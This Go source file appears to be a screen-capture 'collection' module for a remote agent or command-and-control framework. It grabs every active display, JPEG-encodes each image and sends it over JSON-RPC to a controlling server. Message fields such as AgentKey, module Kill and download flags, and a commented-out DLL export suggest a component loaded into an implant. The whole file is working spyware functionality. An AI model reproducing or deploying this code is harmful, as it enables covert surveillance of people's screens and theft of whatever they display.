package main

import (
	"bytes"
	"image/jpeg"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"time"

	"os"

	"github.com/kbinani/screenshot"
)

//ModuleCom -> Data that needs to be sent back to the server side of a module should be structured as so
type ModuleCom struct {
	AgentKey   string //Holds the name of the agent
	Server     bool   //Does the data have a corresponding server portion?
	Download   bool   //Getting the module
	Kill       bool   //Used if the module is finished
	ModuleName string //Name of the module
	ModuleType string //Type of module
	FileType   string //Platform it will run on
	Data       []byte //Data
}

func runModule(port string) {

	//CURRENTLY HARDCODED
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}

		buf := new(bytes.Buffer)
		err = jpeg.Encode(buf, img, nil)
		sendData := buf.Bytes()
		sendon := ModuleCom{"", true, false, false, "screengrab", "collection", ".o", sendData}

		var reply int
		err = client.Call("ModData.SendData", &sendon, &reply)
		if err != nil {
			log.Fatal("RPC error:", err)
		}

	}

	time.Sleep(5 * time.Second)

	//Once all the data hase been sent then we will tell the server to close the other half of the module
	sendon := ModuleCom{"", true, false, true, "screengrab", "collection", ".dll", nil}

	var reply int
	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

}

func main() {
	runModule(os.Args[1])
}

//export StartModule
//StartModule converts the string into a port number
// func StartModule(data *C.char) {
// 	var port string
// 	if len(C.GoString(data)) > 0 {
// 		port = C.GoString(data)
// 	}
// 	runModule(port)
// }
